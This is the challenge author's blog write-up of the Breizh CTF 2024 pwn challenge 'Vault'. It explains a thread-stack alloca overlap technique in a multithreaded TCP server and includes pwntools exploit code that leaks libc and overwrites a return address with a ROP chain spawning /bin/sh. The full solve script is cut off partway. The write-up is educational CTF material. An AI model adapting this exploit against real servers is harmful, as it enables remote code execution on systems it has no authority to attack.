<!DOCTYPE html>
<html lang="en-us">
<head>
  <script defer data-domain="itarow.xyz" src="https://plausible.itarow.xyz/js/plausible.js"></script>
  <link rel="preload" href="/lib/font-awesome/webfonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin="anonymous">
  <link rel="preload" href="/lib/font-awesome/webfonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin="anonymous">
  <link rel="preload" href="/lib/font-awesome/webfonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin="anonymous">
  <link rel="preload" href="/lib/JetBrainsMono/web/woff2/JetBrainsMono-Regular.woff2" as="font" type="font/woff2" crossorigin="anonymous">
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <title> Breizh CTF 2024 - Write-up Vault - Pwn | Itarow</title>
  <link rel = 'canonical' href = 'https://blog.itarow.xyz/posts/bzhctf2024_vault/'>
  <meta name="description" content="CS student, writing some write up of cool CTF&#39;s challenges and infosec content.">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="robots" content="all,follow">
  <meta name="googlebot" content="index,follow,snippet,archive">
  <meta property="og:title" content="Breizh CTF 2024 - Write-up Vault - Pwn" />
<meta property="og:description" content="Here is the write-up of Vault challenge which I created for the Breizh CTF 2024. This is a Pwn challenge classified as difficult.
Description I&#39;ve created a server so I can temporarily store data without putting it on my disk - great idea, isn&#39;t it? In any case, I&#39;m sure there are no vulnerabilities! Note: A VM vagrant is provided if your exploit works locally but not on the remote server for debugging purposes." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://blog.itarow.xyz/posts/bzhctf2024_vault/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2024-05-18T17:50:26+02:00" />
<meta property="article:modified_time" content="2024-05-18T17:50:26+02:00" />

  <meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Breizh CTF 2024 - Write-up Vault - Pwn"/>
<meta name="twitter:description" content="Here is the write-up of Vault challenge which I created for the Breizh CTF 2024. This is a Pwn challenge classified as difficult.
Description I&#39;ve created a server so I can temporarily store data without putting it on my disk - great idea, isn&#39;t it? In any case, I&#39;m sure there are no vulnerabilities! Note: A VM vagrant is provided if your exploit works locally but not on the remote server for debugging purposes."/>

  
  
    
  
  
  <link rel="stylesheet" href="https://blog.itarow.xyz/css/styles.4dd8e96d6c0d53a6965a5a357c26fc29f6b838ad352dc5acda0754ff4b9409e5c58fa94716892c2a5d6a7e1b1bef8fbcaf2442656e81dfae00dc9464d707477d.css" integrity="sha512-TdjpbWwNU6aWWlo1fCb8Kfa4OK01LcWs2gdU/0uUCeXFj6lHFoksKl1qfhsb74&#43;8ryRCZW6B364A3JRk1wdHfQ=="> 

  
  
  
    <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
  

  
<link rel="icon" type="image/png" href="https://blog.itarow.xyz/images/favicon.ico" />

  
  
</head>

<body class="max-width mx-auto px3 ltr">
  <div class="content index py4">

  <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;" aria-label="Top of Page"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
        <li><a href="/">Home</a></li>
         
        <li><a href="/categories">Categories</a></li>
         
        <li><a href="/whoami">Whoami</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li>
          <a class="icon" href=" https://blog.itarow.xyz/posts/fcsc2024_hashed_shellcode/" aria-label="Previous">
            <i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i>
          </a>
        </li>
        
        
        <li>
          <a class="icon" href="https://blog.itarow.xyz/posts/bzhctf2024_usain_bolt/" aria-label="Next">
            <i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i>
          </a>
        </li>
        
        <li>
          <a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" aria-label="Top of Page">
            <i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i>
          </a>
        </li>
        <li>
          <a class="icon" href="#" aria-label="Share">
            <i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i>
          </a>
        </li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      
      <ul>
  
  
    
  
  
  <li>
    <a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fblog.itarow.xyz%2fposts%2fbzhctf2024_vault%2f" aria-label="Facebook">
      <i class="fab fa-facebook " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://twitter.com/share?url=https%3a%2f%2fblog.itarow.xyz%2fposts%2fbzhctf2024_vault%2f&text=Breizh%20CTF%202024%20-%20Write-up%20Vault%20-%20Pwn" aria-label="Twitter">
      <i class="fab fa-twitter " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fblog.itarow.xyz%2fposts%2fbzhctf2024_vault%2f&title=Breizh%20CTF%202024%20-%20Write-up%20Vault%20-%20Pwn" aria-label="Linkedin">
      <i class="fab fa-linkedin " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fblog.itarow.xyz%2fposts%2fbzhctf2024_vault%2f&is_video=false&description=Breizh%20CTF%202024%20-%20Write-up%20Vault%20-%20Pwn" aria-label="Pinterest">
      <i class="fab fa-pinterest " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="mailto:?subject=Breizh%20CTF%202024%20-%20Write-up%20Vault%20-%20Pwn&body=Check out this article: https%3a%2f%2fblog.itarow.xyz%2fposts%2fbzhctf2024_vault%2f" aria-label="Email">
      <i class="fas fa-envelope " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2fblog.itarow.xyz%2fposts%2fbzhctf2024_vault%2f&title=Breizh%20CTF%202024%20-%20Write-up%20Vault%20-%20Pwn" aria-label="Pocket">
      <i class="fab fa-get-pocket " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2fblog.itarow.xyz%2fposts%2fbzhctf2024_vault%2f&title=Breizh%20CTF%202024%20-%20Write-up%20Vault%20-%20Pwn" aria-label="reddit">
      <i class="fab fa-reddit " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fblog.itarow.xyz%2fposts%2fbzhctf2024_vault%2f&name=Breizh%20CTF%202024%20-%20Write-up%20Vault%20-%20Pwn&description=Here%20is%20the%20write-up%20of%20Vault%20challenge%20which%20I%20created%20for%20the%20Breizh%20CTF%202024.%20This%20is%20a%20Pwn%20challenge%20classified%20as%20difficult.%0aDescription%20I%26%2339%3bve%20created%20a%20server%20so%20I%20can%20temporarily%20store%20data%20without%20putting%20it%20on%20my%20disk%20-%20great%20idea%2c%20isn%26%2339%3bt%20it%3f%20In%20any%20case%2c%20I%26%2339%3bm%20sure%20there%20are%20no%20vulnerabilities%21%20Note%3a%20A%20VM%20vagrant%20is%20provided%20if%20your%20exploit%20works%20locally%20but%20not%20on%20the%20remote%20server%20for%20debugging%20purposes." aria-label="Tumblr">
      <i class="fab fa-tumblr " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fblog.itarow.xyz%2fposts%2fbzhctf2024_vault%2f&t=Breizh%20CTF%202024%20-%20Write-up%20Vault%20-%20Pwn" aria-label="Hacker News">
      <i class="fab fa-hacker-news " aria-hidden="true"></i>
    </a>
  </li>
</ul>

    </div>
    
    <div id="toc">
      <nav id="TableOfContents">
  <ul>
    <li><a href="#description">Description</a></li>
    <li><a href="#reverse">Reverse</a>
      <ul>
        <li><a href="#leak-libc">Leak libc</a></li>
      </ul>
    </li>
    <li><a href="#get-a-shell">Get a shell</a></li>
    <li><a href="#full-solve-script">Full solve script</a></li>
  </ul>
</nav>
    </div>
    
  </span>
</div>


  <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
    <header>
      <h1 class="posttitle" itemprop="name headline">
        Breizh CTF 2024 - Write-up Vault - Pwn
      </h1>
      <div class="meta">
        
        <div class="postdate">
          
          <time datetime="2024-05-18 17:50:26 &#43;0200 CEST" itemprop="datePublished">2024-05-18</time>
          
        </div>
        
        
        <div class="article-read-time">
          <i class="far fa-clock"></i>
          
          6 minute read
        </div>
        
        
        <div class="article-category">
            <i class="fas fa-archive"></i>
            
            
            <a class="category-link" href="/categories/bzhctf-2024">BZHCTF 2024</a>
            
        </div>
        
        
      </div>
    </header>

  
    
    <div class="content" itemprop="articleBody">
      <p>Here is the write-up of Vault challenge which I created for the Breizh CTF 2024. This is a Pwn challenge classified as difficult.</p>
<h2 id="description">Description</h2>
<pre tabindex="0"><code>I&#39;ve created a server so I can temporarily store data without putting it on my disk - great idea, isn&#39;t it?

In any case, I&#39;m sure there are no vulnerabilities!

Note: A VM vagrant is provided if your exploit works locally but not on the remote server for debugging purposes. If you have any trouble with it, call me.

Difficulty : Difficult
</code></pre><h2 id="reverse">Reverse</h2>
<p>For this challenges here the files given :</p>
<pre tabindex="0"><code>$ ls
ld-linux-x86-64.so.2  libc.so.6  Vagrantfile  vagrant_provision.sh  vault
$ checksec vault
[*] &#39;/host/vault&#39;
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
</code></pre><p>First, remember to use pwninit to patch the binary file with the good loader and libc.</p>
<p>Fire up IDA and let&rsquo;s reverse the binary.</p>
<p><img src="/img/bzhctf2024_vault/1.png" alt=""></p>
<p>This is a basic thread TCP server which run connection_handler for every connection.</p>
<p><img src="/img/bzhctf2024_vault/2.png" alt=""></p>
<p>There are two commands: create a vault and read it. The function <code>create_temp_vault</code> returns a pointer of the buffer and its content. There are no global variables, so it does not seem to contain some race condition vulnerabilities.</p>
<p>Here is the code for the <code>create_temp_vault</code> function:</p>
<p><img src="/img/bzhctf2024_vault/3.png" alt=""></p>
<p>This function asks for a buffer size combined with the atoi function and gets the result in 32 bits.</p>
<p>The output of the decompiler is a bit wrong if we check the assembly. It detects the use of the alloca function. <code>alloca</code> function is basically the <code>sub rsp, rax</code> instruction, where <code>rax</code> contains the size of the allocation. This is an allocation in the stack, not very common. Next there is a read call on the result of the alloca call (read content from the socket). So there is no buffer overflow. We could expect some integer overflow but the size is restricted to 32 bits so no vulnerability. A null byte is placed on the last characters read to be used with the print functionality of the program.</p>
<p>This null byte avoid basic leak of data.
The read command applies a strlen call to the buffer and sends it with a send call.</p>
<p>Where is the vulnerability? Actually, there is no basic vulnerability. The thing to note here is the fact this is a multithread server. Why a multithread server for a pwn challenge if this binary could be exposed with socat for example? Because the program is only exploitable with threads. We could notice here that there is no limit on the size of the buffer. The limit is a 32-bit number. We could crash the binary because the stack is thread-specific with a big size. But could we abuse this to make the alloca function return on a address of the stack of the other thread ? The answer is yes!</p>
<p>This type of exploitation is described here : <a href="https://github.com/orangetw/My-Presentation-Slides/blob/main/data/2023-A-3-Years-Tale-of-Hacking-a-Pwn2Own-Target.pdf">https://github.com/orangetw/My-Presentation-Slides/blob/main/data/2023-A-3-Years-Tale-of-Hacking-a-Pwn2Own-Target.pdf</a> which is a presentation of Orange Tsai during Hexacon 2023.</p>
<p>I will steal one of his slides because the schema is perfect:</p>
<p><img src="/img/bzhctf2024_vault/4.png" alt=""></p>
<p>The space between thread stacks is a fixed size, so we could base all our exploit on alloca sizes.</p>
<h3 id="leak-libc">Leak libc</h3>
<p>We know we need to play with other thread stacks, but first, how do we get a libc leak ? We know a null byte will be placed at the end of our input so the content of the buffer should be overwritten. We could use two threads for this. One thread is going to allocate the buffer, and the next thread is going to make calls (read option) to place addresses on his stack. The first thread is going to print content (which was overwritten by the read option), and a libc address will be leaked.</p>
<p><img src="/img/bzhctf2024_vault/5.png" alt=""></p>
<p>With gdb by placing a breakpoint after the second read call and observe the stack frame. We could see some calls to read put a libc address on the stack, it&rsquo;s a perfect candidate for our leak. We only need to calculate the difference between this target address (aligned on 16 bits) and the address where the sub rsp occurs and the other thread. Here is the code snippet to do this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span>t1 <span style="color:#f92672">=</span> conn() <span style="color:#75715e"># upper stack address</span>
</span></span><span style="display:flex;"><span>t2 <span style="color:#f92672">=</span> conn() <span style="color:#75715e"># lower stack address (Thread to be used for the leak)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> t1
</span></span><span style="display:flex;"><span>rsp_t1 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00007ffff7d84da0</span>
</span></span><span style="display:flex;"><span>target_t2 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00007ffff7583d50</span><span style="color:#f92672">-</span><span style="color:#ae81ff">16</span> <span style="color:#75715e"># some read call address</span>
</span></span><span style="display:flex;"><span>create(rsp_t1<span style="color:#f92672">-</span>target_t2,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">16</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> t2
</span></span><span style="display:flex;"><span>create(<span style="color:#ae81ff">40</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;AZE&#34;</span>) <span style="color:#75715e"># trigger stack frames creation</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> t1
</span></span><span style="display:flex;"><span>leak <span style="color:#f92672">=</span> unpack(read()[<span style="color:#ae81ff">8</span>:]<span style="color:#f92672">.</span>strip(),<span style="color:#e6db74">&#34;all&#34;</span>)
</span></span><span style="display:flex;"><span>logleak(<span style="color:#e6db74">&#34;Leak libc&#34;</span>,leak)
</span></span><span style="display:flex;"><span>libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> leak <span style="color:#f92672">-</span> <span style="color:#ae81ff">0xf81c7</span>
</span></span></code></pre></div><p>We get our libc leak !</p>
<h2 id="get-a-shell">Get a shell</h2>
<p>Now, how to get a shell ? The schema is the same. We are going to have two threads, one thread which is our victim and a second which we will use to do to overwrite. What could we oubviously overwrite in the stack? Return address.</p>
<p>We are going to place a rop chain with this overwrite and return to it.</p>
<p>To choose the target stack frame to overwrite, we could use the simplest, the one of create_temp_vault. This is the easiest because we could use the read call to pause the thread, overwrite the function return address, and send data to continue the thread, which will return on our ROP.</p>
<p>For the ROP chain, we only have to use a dup2 call to duplicate stdout and stdin the file descriptor to the target thread file descriptor (the first for us). Then calls <code>system(&quot;/bin/sh&quot;)</code> and profit :).</p>
<p>Here is the code:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span>t3 <span style="color:#f92672">=</span> conn() <span style="color:#75715e"># upper stack address</span>
</span></span><span style="display:flex;"><span>t4 <span style="color:#f92672">=</span> conn() <span style="color:#75715e"># lower stack address (Thread to be used for the leak)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> t4
</span></span><span style="display:flex;"><span>rsp_t3 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7ffff6d82dc0</span>
</span></span><span style="display:flex;"><span>target_t4 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7ffff6581e00</span><span style="color:#f92672">+</span><span style="color:#ae81ff">16</span> <span style="color:#75715e"># create_temp_vault return addr</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;: &#34;</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;1&#34;</span>)
</span></span><span style="display:flex;"><span>sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;?</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,str(size)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> t3
</span></span><span style="display:flex;"><span>rop <span style="color:#f92672">=</span> ROP([libc])
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>binsh <span style="color:#f92672">=</span> next(libc<span style="color:#f92672">.</span>search(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;/bin/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>))
</span></span><span style="display:flex;"><span>ret <span style="color:#f92672">=</span> rop<span style="color:#f92672">.</span>find_gadget([<span style="color:#e6db74">&#39;ret&#39;</span>])[<span style="color:#ae81ff">0</span>]
</span></span><span style="display:flex;"><span>pop_rcx <span style="color:#f92672">=</span> rop<span style="color:#f92672">.</span>find_gadget([<span style="color:#e6db74">&#39;pop rcx&#39;</span>,<span style="color:#e6db74">&#39;ret&#39;</span>])[<span style="color:#ae81ff">0</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>rop<span style="color:#f92672">.</span>raw(ret)
</span></span><span style="display:flex;"><span>rop<span style="color:#f92672">.</span>raw(ret)
</span></span><span style="display:flex;"><span>rop<span style="color:#f92672">.</span>raw(ret)
</span></span><span style="display:flex;"><span>rop<span style="color:#f92672">.</span>raw(pop_rcx) <span style="color:#75715e"># bypass WTF broken addr in the stack</span>
</span></span><span style="display:flex;"><span>rop<span style="color:#f92672">.</span>raw(<span style="color:#ae81ff">0xdead</span>)
</span></span><span style="display:flex;"><span>rop<span style="color:#f92672">.</span>dup2(<span style="color:#ae81ff">4</span>,<span style="color:#ae81ff">0</span>) <span style="color:#75715e"># FD of the first thread</span>
</span></span><span style="display:flex;"><span>rop<span style="color:#f92672">.</span>dup2(<span style="color:#ae81ff">4</span>,<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>rop<span style="color:#f92672">.</span>execve(binsh,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#print(rop.dump())</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>pld <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#pld += b&#34;BBBBBBBB&#34;</span>
</span></span><span style="display:flex;"><span>pld <span style="color:#f92672">+=</span> bytes(rop)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>create(rsp_t3<span style="color:#f92672">-</span>target_t4,pld) <span style="color:#75715e"># write ROP</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">2</span>)
</span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> t4
</span></span><span style="display:flex;"><span>sl(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;trigger&#34;</span>) <span style="color:#75715e"># trigger recv and return from function</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> t1 <span style="color:#75715e"># get the shell with the first thread</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#io.recvall(timeout=0.5)</span>
</span></span><span style="display:flex;"><span>time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;cat /flag*&#34;</span>)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><p>Some addresses were overwritten so I used a gadget (pop rcx) to deny them. The exploit works:</p>
<p><img src="/img/bzhctf2024_vault/7.png" alt=""></p>
<p>Flag : <code>BZHCTF{Thread_Feng_Shui_Like_An_Orange-&gt;https://github.com/orangetw/My-Presentation-Slides/blob/main/data/2023-A-3-Years-Tale-of-Hacking-a-Pwn2Own-Target.pdf}</code></p>
<h2 id="full-solve-script">Full solve script</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> time 
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> sys
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> len(sys<span style="color:#f92672">.</span>argv) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">3</span>:
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;Usage solve.py &lt;host&gt; &lt;port&gt;&#34;</span>)
</span></span><span style="display:flex;"><span>    exit(<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>_, host, port <span style="color:#f92672">=</span> sys<span style="color:#f92672">.</span>argv
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>terminal <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#34;tmux&#34;</span>, <span style="color:#e6db74">&#34;new-window&#34;</span>]
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;info&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>exe <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./vault&#34;</span>)
</span></span><span style="display:flex;"><span>libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./libc.so.6&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> exe
</span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">one_gadget</span>(filename, base_addr<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>):
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> [(int(i)<span style="color:#f92672">+</span>base_addr) <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> subprocess<span style="color:#f92672">.</span>check_output([<span style="color:#e6db74">&#39;one_gadget&#39;</span>, <span style="color:#e6db74">&#39;--raw&#39;</span>, <span style="color:#e6db74">&#39;-l0&#39;</span>, filename])<span style="color:#f92672">.</span>decode()<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39; &#39;</span>)]
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">logbase</span>(): log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;libc base = </span><span style="color:#e6db74">%#x</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> libc<span style="color:#f92672">.</span>address)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">logleak</span>(name, val): info(name<span style="color:#f92672">+</span><span style="color:#e6db74">&#34; = </span><span style="color:#e6db74">%#x</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> val)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">sla</span>(delim,line): <span style="color:#66d9ef">return</span> io<span style="color:#f92672">.</span>sendlineafter(delim,line)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">sl</span>(line): <span style="color:#66d9ef">return</span> io<span style="color:#f92672">.</span>sendline(line)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">rcu</span>(delim): <span style="color:#66d9ef">return</span> io<span style="color:#f92672">.</span>recvuntil(delim)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">rcv</span>(number): <span style="color:#66d9ef">return</span> io<span style="color:#f92672">.</span>recv(number)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">rcvl</span>(): <span style="color:#66d9ef">return</span> io<span style="color:#f92672">.</span>recvline()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">conn</span>():
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">global</span> io
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>REMOTE:
</span></span><span style="display:flex;"><span>        io <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;&#34;</span>, )
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>        io <span style="color:#f92672">=</span> remote(host,int(port))
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> io
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">create</span>(size,buffer):
</span></span><span style="display:flex;"><span>    sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;: &#34;</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;1&#34;</span>)
</span></span><span style="display:flex;"><span>    sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;?</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,str(size)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>    sl(buffer)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">read</span>():
</span></span><span style="display:flex;"><span>    sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;: &#34;</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;2&#34;</span>)
</span></span><span style="display:flex;"><span>    content <span style="color:#f92672">=</span> rcvl()
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> content
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exit_</span>():
</span></span><span style="display:flex;"><span>    sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;: &#34;</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;3&#34;</span>)
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span>t1 <span style="color:#f92672">=</span> conn() <span style="color:#75715e"># upper stack address</span>
</span></span><span style="display:flex;"><span>t2 <span style="color:#f92672">=</span> conn() <span style="color:#75715e"># lower stack address (Thread to be used for the leak)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> t1
</span></span><span style="display:flex;"><span>rsp_t1 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00007ffff7d84da0</span>
</span></span><span style="display:flex;"><span>target_t2 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00007ffff7583d50</span><span style="color:#f92672">-</span><span style="color:#ae81ff">16</span> <span style="color:#75715e"># read call return address</span>
</span></span><span style="display:flex;"><span>create(rsp_t1<span style="color:#f92672">-</span>target_t2,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">16</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> t2
</span></span><span style="display:flex;"><span>create(<span style="color:#ae81ff">40</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;AZE&#34;</span>) <span style="color:#75715e"># trigger stack frames creation</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> t1
